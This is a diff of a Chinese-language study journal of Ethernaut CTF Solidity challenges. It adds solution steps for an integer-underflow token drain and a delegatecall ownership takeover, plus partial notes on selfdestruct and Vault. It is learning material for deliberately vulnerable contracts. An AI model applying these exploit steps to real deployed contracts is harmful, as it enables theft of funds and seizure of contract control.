@@ -139,7 +139,7 @@ Rubixi hack
 >>##### 目標： 成為owner
 >>##### 先備知識
 >> - tx.origin 和 msg.sender 的不同
->>
+>> ###### 解題
 >> 設計一個由contract地址幫玩家交互的function執行
 >> 
 >>```solidity
@@ -154,6 +154,55 @@ Rubixi hack
 >>    }
 >> }
 >>```
+>#### Ethernaut CTF (6/31)
+>>##### Token
+>>##### 目標： 得到更多tokens，最好大量
+>>##### 先備知識
+>> -  Underflow and Overflow
 
 
+### 2024.09.03
+>> ###### 解題
+>> 1. uint256 範圍 0 ~ 2²⁵⁶ — 1.
+>> 2. trasfer function 並沒有檢查扣完後會不會underflow
+>>    ```solidity
+>>     function transfer(address _to, uint256 _value) 
+>>     public returns (bool) {
+>>         require(balances[msg.sender] - _value >= 0);
+>>         balances[msg.sender] -= _value;
+>>         balances[_to] += _value;
+>>         return true;
+>>     }
+>>    ``` 
+>> 3.把transfer的數量大於持有的數量
+>>   `contract.transfer(contract.address, 21)`
+>> 4.`await contract.balanceOf(player)`會發現持有超多token
+>> 通關~
+>> 
+>#### Ethernaut CTF (7/31)
+>>##### Delegation
+>>##### 目標： 成為owner
+>>##### 先備知識
+>> - [delegatecall](https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how)
+>> - [encodeFunctionSignature](https://www.rareskills.io/post/abi-encoding)
+>> ###### 解題
+>> 1.取得signature `signature = web3.eth.abi.encodeFunctionSignature("pwn()")`
+>>2.利用sendTransaction 觸發callback `contract.sendTransaction({ from: player, data: signature })`
+>>3.成為owner
+
+### 2024.09.04
+>#### Ethernaut CTF (7/31)
+>>##### Delegation
+>>##### 目標：強迫收款
+>>##### 先備知識
+>> - [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/) deprecate
+>> 一個把當前合約毀滅並把剩餘ether轉換到指定地址
+>> ###### 解題 (失敗)
+
+>#### Ethernaut CTF (8/31)
+>>##### Vault
+>>##### 目標：Unlock the vault
+>>##### 先備知識
+>> - 如何獲取變數位置
+### 2024.09.05
 <!-- Content_END -->
